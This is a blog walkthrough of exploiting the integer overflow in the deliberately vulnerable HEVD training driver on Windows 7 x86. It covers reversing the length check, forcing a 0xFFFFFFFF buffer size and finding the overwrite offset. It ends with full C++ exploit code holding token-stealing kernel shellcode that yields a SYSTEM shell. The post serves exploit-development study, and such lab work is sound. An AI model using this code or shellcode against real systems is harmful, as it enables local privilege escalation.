---
layout: single
title: HEVD Exploits -- Windows 7 x86 Integer Overflow
date: 2020-04-20
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Exploit Dev
  - Drivers
  - Windows
  - x86
  - Shellcoding
  - Kernel Exploitation
  - Integer Overflow
---

## Introduction
Continuing on with my goal to develop exploits for the [Hacksys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver). **I will be using HEVD 2.0**. There are a ton of good blog posts out there walking through various HEVD exploits. I recommend you read them all! I referenced them heavily as I tried to complete these exploits. Almost nothing I do or say in this blog will be new or my own thoughts/ideas/techniques. There were instances where I diverged from any strategies I saw employed in the blogposts out of necessity or me trying to do my own thing to learn more.

**This series will be light on tangential information such as:**
+ how drivers work, the different types, communication between userland, the kernel, and drivers, etc
+ how to install HEVD,
+ how to set up a lab environment
+ shellcode analysis

The reason for this is simple, the other blog posts do a much better job detailing this information than I could ever hope to. It feels silly writing this blog series in the first place knowing that there are far superior posts out there; I will not make it even more silly by shoddily explaining these things at a high-level in poorer fashion than those aforementioned posts. Those authors have way more experience than I do and far superior knowledge, I will let them do the explaining. :)

This post/series will instead focus on my experience trying to craft the actual exploits.

## Thanks
Thanks to @tekwizz123, I used his method of setting up the exploit buffer for the most part as the Windows macros I was using weren't working (obviously user error.)

## Integer Overflow
This was a really interesting bug to me. Generically, the bug is when you have some arithmetic in your code that allows for unintended behavior. The bug in question here involved incrementing a `DWORD` value that was set `0xFFFFFFFF` which overflows the integer size and wraps the value around back to `0x00000000`. If you add `0x4` to `0xFFFFFFFF`, you get `0x100000003`. However, this value is now over 8 bytes in length, so we lose the leading `1` and we're back down to `0x00000003`. Here is a small demo program:
```cpp
#include <iostream>
#include <Windows.h>

int main() {

	DWORD var1 = 0xFFFFFFFF;
	DWORD var2 = var1 + 0x4;

	std::cout << ">> Variable One is: " << std::hex << var1 << "\n";
	std::cout << ">> Variable Two is: " << std::hex << var2 << "\n";
}
```

Here is the output:
```
>> Variable One is: ffffffff
>> Variable Two is: 3
```

I actually learned about this concept from Gynvael Coldwind's [stream on fuzzing](https://www.youtube.com/watch?v=BrDujogxYSk). I also found the bug in my own code for an exploit on a real vulnerability I will hopefully be doing a write-up for soon (when the CVE gets published.) Now that we know how the bug occurs, let's go find the bug in the driver in IDA and figure out how we can take advantage. 

## Reversing the Function
![](/assets/images/AWE/IntOverflowFunc.PNG)

With the benefit of the comments I made in IDA, we can kind of see how this works. I've annotated where everything is after stepping through in WinDBG. 

The first thing we notice here is that `ebx` gets loaded with the length of our input buffer in `DeviceIoControl` when we do this operation here: `move ebx, [ebp+Size]`. This is kind of obvious, but I hadn't really given it much thought before. We allocate an input buffer in our code, usually its a character or byte array, and then we usually satisfy the `DWORD nInBufferSize` parameter by doing something like `sizeof(input_buffer)` because we actually want it to be accurate. Later, we might actually lie a little bit here. 

Now that `ebx` is the length of our input buffer, we see that it gets `+4` added to it and then loaded into to `eax`. If we had an input buffer of `0x7FC`, adding `0x4` to it would make it `0x800`. A really important thing to note here is that we've essentially created a new length variable in `eax` and kept our old one in `ebx` intact. In this case, `eax` would be `0x800` and `ebx` would still hold `0x7FC`. 

Next, `eax` is compared to `esi` which we can see holds `0x800`. If the `eax` is equal to or more than `0x800`, we can see that take the red path down to the `Invalid UserBuffer Size` debug message. We don't want that. We need to satisfy this `jbe` condition. 

If we satisfy the `jbe` condition, we branch down to `loc_149A5`. We put our buffer length from `ebx` into `eax` and then we effectively divide it by 4 since we do a bit shift right of 2. We compare this to quotient to `edi` which was zeroed out previously and has remained up until now unchanged. If length/4 quotient is the same or more than the counter, we move to `loc_149F1` where we will end up exiting the function soon after. Right now, since our length is more than `edi`, we'll jump to `mov eax, [ebp+8]`. 

This series of operations is actually the interesting part. `eax` is given a pointer to our input buffer and we compare the value there with `0BAD0B0B0`. If they are the same value, we move towards exiting the function. So, so far we have identified two conditions where we'll exit the function: if `edi` is ever equal to or more than the length of our input buffer divided by 4 ***OR*** if the 4 byte value located at `[ebp+8]` is equal to `0BAD0B0B0`.

Let's move on to the final puzzle piece. `mov [ebp+edi*4+KernelBuffer], eax` is kind of convoluted looking but what it's doing is placing the 4 byte value in `eax` into the kernel buffer at index `edi * 0x4`. Right now, `edi` is 0, so it's placing the 4 byte value right at the beginning of the kernel buffer. After this, the `dword ptr` value at `ebp+8` is incremented by `0x4`. This is interesting because we already know that `ebp+0x8` is where the pointer is to our input buffer. So now that we've placed the first four bytes from our input buffer into the kernel buffer, we move now to the next 4 bytes. We see also that `edi` incremented and we now understand what is taking place. 

As long as:

1. the length of our buffer + 4 is `< 0x800`,
2. the `Counter` variable (`edi`) is `<` the length of our buffer divided by 4, 
3. and the 4 byte value in `eax` is not `0BAD0B0B0`,

we will copy 4 bytes of our input buffer into the kernel buffer and then move onto the next 4 bytes in the input buffer to test criteria 2 and 3 again. 

There can't really be a problem with copying bytes from the user buffer into the kernel buffer unless somehow the copying exceeds the space allocated in the kernel buffer. If that occurs, we'll begin overwriting adjacent memory with our user buffer. How can we fool this length + `0x4` check?

## Manipulating `DWORD nInBufferSize`
First we'll send a vanilla payload to test our theories up to this point. Let's start by sending a buffer full of all `\x41` chars and it will be a length of `0x750` (null-terminated). We'll use the `sizeof() - 1` method to form our `nInBufferSize` parameter and account for the null terminator as well so that everything is accurate and consistent. Our code will look like this at this point:
```cpp
#include <iostream>
#include <string>
#include <iomanip>

#include <Windows.h>

using namespace std;

#define DEVICE_NAME         "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL               0x222027

HANDLE get_handle() {

    HANDLE hFile = CreateFileA(DEVICE_NAME,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        cout << "[!] No handle to HackSysExtremeVulnerableDriver.\n";
        exit(1);
    }

    cout << "[>] Handle to HackSysExtremeVulnerableDriver: " << hex << hFile
        << "\n";

    return hFile;
}

void send_payload(HANDLE hFile) {

    

    BYTE input_buff[0x751] = { 0 };

    // 'A' * 1871
    memset(
        input_buff,
        '\x41',
        0x750);

    cout << "[>] Sending buffer of size: " << sizeof(input_buff) - 1  << "\n";

    DWORD bytes_ret = 0x0;

    int result = DeviceIoControl(hFile,
        IOCTL,
        &input_buff,
        sizeof(input_buff) - 1,
        NULL,
        0,
        &bytes_ret,
        NULL);

    if (!result) {
        cout << "[!] Payload failed.\n";
    }
}

int main()
{
    HANDLE hFile = get_handle();

    send_payload(hFile);
}
```

What are our predictions for this code? What conditions will we hit? The criteria for copying bytes from user buffer to kernel buffer was: 
1. the length of our buffer + 4 is `< 0x800`,
2. the `Counter` variable (`edi`) is `<` the length of our buffer divided by 4, 
3. and the 4 byte value in `eax` is not `0BAD0B0B0`

We should pass the first check since our buffer is indeed small enough. This second check will eventually make us exit the function since our length divided by 4, will eventually be caught by the `Counter` as it increments every 4 byte copy. We don't have to worry about the third check as we don't have this string in our payload. Let's send it and step through it in WinDBG. 

![](/assets/images/AWE/intover1.PNG)

This picture helps us a lot. I've set a breakpoint on the comparison between the length of our buffer + 4 and `0x800`. As you can see, `eax` holds `0x754` which is what we would expect since we sent a `0x750` byte buffer. 

In the bottom right, we our user buffer was allocated at `0x0012f184`. Let's set a [break on access](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/ba--break-on-access-) at `0x0012f8d0` since that is `0x74c` away from where we are now, which is `0x4` short of `0x750`. If this 4 byte address is accessed for a read-operation we should hit our breakpoint. This will occur when the program goes to copy the 4 byte value here to the kernel buffer. 

The syntax is `ba r1 0x0012f8d0` which means "break on access if there is a read of at least 1 byte at that address."

We resume from here, we hit our breakpoint. 

![](/assets/images/AWE/intover2.PNG)

Take a look at `edi`, we can see our counter has incremented `0x1d3` times at this point, which is very close to the length of our buffer (`0x750`) divided by `0x4` (`0x1d4`). We can see that right now, we're doing a comparison on the 4 byte value at this address to `ecx` or `bad0b0b0`. We won't hit that criteria but on the next iteration, our counter will be `==` to `0x1d4` and thus, we will be finished copying bytes into the kernel buffer. Everything worked as expected. Now let's send a fake `DWORD nInBufferSize` value of `0xFFFFFFFF` and watch us sail right through length check and see what else we bypass. 

Our `DeviceIoControl` call now looks like this:
```cpp
int result = DeviceIoControl(hFile,
        IOCTL,
        &input_buff,
        ULONG_MAX,
        NULL,
        0,
        &bytes_ret,
        NULL);
```

When we hit a breakpoint at the point where we see `eax` being loaded with our user buffer length + `0x4`, we see that right before the arithmetic, we are at a length of `0xffffffff` in `ebx`. 

![](/assets/images/AWE/intover3.PNG)

Then after the operation, we see `eax` rolls over to `0x3`.

![](/assets/images/AWE/intover4.PNG)

So we will pass the length check now for sure, which we saw coming, the **other** really interesting thing that we took note of previously but can see playing out here is that `ebx` has been left undisturbed and is at `0xffffffff` still. This is the register used in the arithmetic to determine whether or not the `Counter` should keep iterating or not. This value is eventually loaded into `eax` and divided by 4!. `0xfffffffff` divided by 4 will likely never cause us to exit the function. We will keep copying bytes from the user buffer to the kernel buffer basically forever now. 

***THIS IS NOT GOOD***

Overwriting arbitrary memory in the kernel space is dangerous business. We can't corrupt anything more than we absolutely have to. We need a way to terminate the copying function. In comes the terminator string of `0BAD0B0B0` to the rescue. If the 4 byte value in the user buffer is `0BAD0B0B0`, we cease copying and exit the function. Obviously we BSOD here. 

So hopefully, we can copy `0x800` bytes, and then start overwriting kernel memory on the stack where we can strategically place a pointer to shellcode. Like I said previously, you don't want a huge overwrite here. I started at `0x800` and worked my way up 4 bytes at a time using a little pattern creating tool I made [here](https://github.com/h0mbre/Windows-Exploits/tree/master/Pattern) until I got a crash. 

Incrementing 4 bytes at a time I finally got a crash with a `0x830` buffer length where the last 4 bytes are `0BAD0B0B0`.

## Getting a Crash
After incrementing methodically from a buffer size of `0x800`, and remember that this includes a 4 byte terminator string or else we'll never stop copying into kernel space and BSOD the host, I finally got an exception that tried to execute code at `41414141` with a total buffer size of `0x830`. (I also got an exception when I used a smaller buffer size of `0x82C` but the address referenced was a NULL). In this buffer, I had `0x82C` `\x41` chars and then our terminator. So I figured our offset was going to be at `0x828` or 2088 in decimal, but just to make sure I used my pattern python script to get the exact offset. 
```
root@kali:~# python3 pattern.py -c 2092 -cpp
char pattern[] = 
"0Aa0Ab0Ac0Ad0Ae0Af0Ag0Ah0Ai0Aj0Ak0Al0Am0An0Ao0Ap0Aq0Ar0As0At0Au0Av0Aw0Ax0Ay0Az"
"0A00A10A20A30A40A50A60A70A80A90AA0AB0AC0AD0AE0AF0AG0AH0AI0AJ0AK0AL0AM0AN0AO0AP"
"0AQ0AR0AS0AT0AU0AV0AW0AX0AY0AZ0Ba0Bb0Bc0Bd0Be0Bf0Bg0Bh0Bi0Bj0Bk0Bl0Bm0Bn0Bo0Bp"
"0Bq0Br0Bs0Bt0Bu0Bv0Bw0Bx0By0Bz0B00B10B20B30B40B50B60B70B80B90BA0BB0BC0BD0BE0BF"
"0BG0BH0BI0BJ0BK0BL0BM0BN0BO0BP0BQ0BR0BS0BT0BU0BV0BW0BX0BY0BZ0Ca0Cb0Cc0Cd0Ce0Cf"
"0Cg0Ch0Ci0Cj0Ck0Cl0Cm0Cn0Co0Cp0Cq0Cr0Cs0Ct0Cu0Cv0Cw0Cx0Cy0Cz0C00C10C20C30C40C5"
"0C60C70C80C90CA0CB0CC0CD0CE0CF0CG0CH0CI0CJ0CK0CL0CM0CN0CO0CP0CQ0CR0CS0CT0CU0CV"
"0CW0CX0CY0CZ0Da0Db0Dc0Dd0De0Df0Dg0Dh0Di0Dj0Dk0Dl0Dm0Dn0Do0Dp0Dq0Dr0Ds0Dt0Du0Dv"
"0Dw0Dx0Dy0Dz0D00D10D20D30D40D50D60D70D80D90DA0DB0DC0DD0DE0DF0DG0DH0DI0DJ0DK0DL"
"0DM0DN0DO0DP0DQ0DR0DS0DT0DU0DV0DW0DX0DY0DZ0Ea0Eb0Ec0Ed0Ee0Ef0Eg0Eh0Ei0Ej0Ek0El"
"0Em0En0Eo0Ep0Eq0Er0Es0Et0Eu0Ev0Ew0Ex0Ey0Ez0E00E10E20E30E40E50E60E70E80E90EA0EB"
"0EC0ED0EE0EF0EG0EH0EI0EJ0EK0EL0EM0EN0EO0EP0EQ0ER0ES0ET0EU0EV0EW0EX0EY0EZ0Fa0Fb"
"0Fc0Fd0Fe0Ff0Fg0Fh0Fi0Fj0Fk0Fl0Fm0Fn0Fo0Fp0Fq0Fr0Fs0Ft0Fu0Fv0Fw0Fx0Fy0Fz0F00F1"
"0F20F30F40F50F60F70F80F90FA0FB0FC0FD0FE0FF0FG0FH0FI0FJ0FK0FL0FM0FN0FO0FP0FQ0FR"
"0FS0FT0FU0FV0FW0FX0FY0FZ0Ga0Gb0Gc0Gd0Ge0Gf0Gg0Gh0Gi0Gj0Gk0Gl0Gm0Gn0Go0Gp0Gq0Gr"
"0Gs0Gt0Gu0Gv0Gw0Gx0Gy0Gz0G00G10G20G30G40G50G60G70G80G90GA0GB0GC0GD0GE0GF0GG0GH"
"0GI0GJ0GK0GL0GM0GN0GO0GP0GQ0GR0GS0GT0GU0GV0GW0GX0GY0GZ0Ha0Hb0Hc0Hd0He0Hf0Hg0Hh"
"0Hi0Hj0Hk0Hl0Hm0Hn0Ho0Hp0Hq0Hr0Hs0Ht0Hu0Hv0Hw0Hx0Hy0Hz0H00H10H20H30H40H50H60H7"
"0H80H90HA0HB0HC0HD0HE0HF0HG0HH0HI0HJ0HK0HL0HM0HN0HO0HP0HQ0HR0HS0HT0HU0HV0HW0HX"
"0HY0HZ0Ia0Ib0Ic0Id0Ie0If0Ig0Ih0Ii0Ij0Ik0Il0Im0In0Io0Ip0Iq0Ir0Is0It0Iu0Iv0Iw0Ix"
"0Iy0Iz0I00I10I20I30I40I50I60I70I80I90IA0IB0IC0ID0IE0IF0IG0IH0II0IJ0IK0IL0IM0IN"
"0IO0IP0IQ0IR0IS0IT0IU0IV0IW0IX0IY0IZ0Ja0Jb0Jc0Jd0Je0Jf0Jg0Jh0Ji0Jj0Jk0Jl0Jm0Jn"
"0Jo0Jp0Jq0Jr0Js0Jt0Ju0Jv0Jw0Jx0Jy0Jz0J00J10J20J30J40J50J60J70J80J90JA0JB0JC0JD"
"0JE0JF0JG0JH0JI0JJ0JK0JL0JM0JN0JO0JP0JQ0JR0JS0JT0JU0JV0JW0JX0JY0JZ0Ka0Kb0Kc0Kd"
"0Ke0Kf0Kg0Kh0Ki0Kj0Kk0Kl0Km0Kn0Ko0Kp0Kq0Kr0Ks0Kt0Ku0Kv0Kw0Kx0Ky0Kz0K00K10K20K3"
"0K40K50K60K70K80K90KA0KB0KC0KD0KE0KF0KG0KH0KI0KJ0KK0KL0KM0KN0KO0KP0KQ0KR0KS0KT"
"0KU0KV0KW0KX0KY0KZ0La0Lb0Lc0Ld0Le0Lf0Lg0Lh0Li0Lj0Lk0Ll0Lm0Ln0Lo0";
```
I then added the terminator to the end like so.
```
---SNIP---
...Lm0Ln0Lo0\xb0\xb0\xd0\xba";
```

And we see I got an access violation at `306f4c30`.

![](/assets/images/AWE/intover5.PNG)

Using pattern again, I got the exact offset and we confirmed our suspicions. 
```
root@kali:~# python3 pattern.py -o 306f4c30
Exact offset found at position: 2088
```

From here on out, this plays out just like stack buffer overflow post, so please reference those posts if you have any questions! We initialize our shellcode, create a RWX buffer for it, move it there, and then use the address of the buffer to overwrite `eip` at that offset we found. 

## Final Code
```cpp
#include <iostream>
#include <string>
#include <iomanip>

#include <Windows.h>

using namespace std;

#define DEVICE_NAME         "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL               0x222027

HANDLE get_handle() {

    HANDLE hFile = CreateFileA(DEVICE_NAME,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        cout << "[!] No handle to HackSysExtremeVulnerableDriver.\n";
        exit(1);
    }

    cout << "[>] Handle to HackSysExtremeVulnerableDriver: " << hex << hFile
        << "\n";

    return hFile;
}

void send_payload(HANDLE hFile) {

    char shellcode[] = (
        "\x60"
        "\x64\xA1\x24\x01\x00\x00"
        "\x8B\x40\x50"
        "\x89\xC1"
        "\x8B\x98\xF8\x00\x00\x00"
        "\xBA\x04\x00\x00\x00"
        "\x8B\x80\xB8\x00\x00\x00"
        "\x2D\xB8\x00\x00\x00"
        "\x39\x90\xB4\x00\x00\x00"
        "\x75\xED"
        "\x8B\x90\xF8\x00\x00\x00"
        "\x89\x91\xF8\x00\x00\x00"
        "\x61"
        "\x5d"
        "\xc2\x08\x00"
        );

    LPVOID shellcode_address = VirtualAlloc(NULL,
        sizeof(shellcode),
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    memcpy(shellcode_address, shellcode, sizeof(shellcode));

    cout << "[>] RWX shellcode allocated at: " << hex << shellcode_address
        << "\n";

    BYTE input_buff[0x830] = { 0 };

    // 'A' * 0x828
    memset(input_buff, '\x41', 0x828);

    memcpy(input_buff + 0x828, &shellcode_address, 0x4);

    BYTE terminator[] = "\xb0\xb0\xd0\xba";

    memcpy(input_buff + 0x82c, &terminator, 0x4);

    cout << "[>] Sending buffer of size: " << sizeof(input_buff) << "\n";

    DWORD bytes_ret = 0x0;

    int result = DeviceIoControl(hFile,
        IOCTL,
        &input_buff,
        ULONG_MAX,
        NULL,
        0,
        &bytes_ret,
        NULL);

    if (!result) {
        cout << "[!] Payload failed.\n";
    }
}

void spawn_shell()
{
    PROCESS_INFORMATION Process_Info;
    ZeroMemory(&Process_Info, 
        sizeof(Process_Info));
    
    STARTUPINFOA Startup_Info;
    ZeroMemory(&Startup_Info, 
        sizeof(Startup_Info));
    
    Startup_Info.cb = sizeof(Startup_Info);

    CreateProcessA("C:\\Windows\\System32\\cmd.exe",
        NULL, 
        NULL, 
        NULL, 
        0, 
        CREATE_NEW_CONSOLE, 
        NULL, 
        NULL, 
        &Startup_Info, 
        &Process_Info);
}

int main()
{
    HANDLE hFile = get_handle();

    send_payload(hFile);

    spawn_shell();
}
```

## Conclusion
This should net you a system shell. 

![](/assets/images/AWE/intover5.PNG)
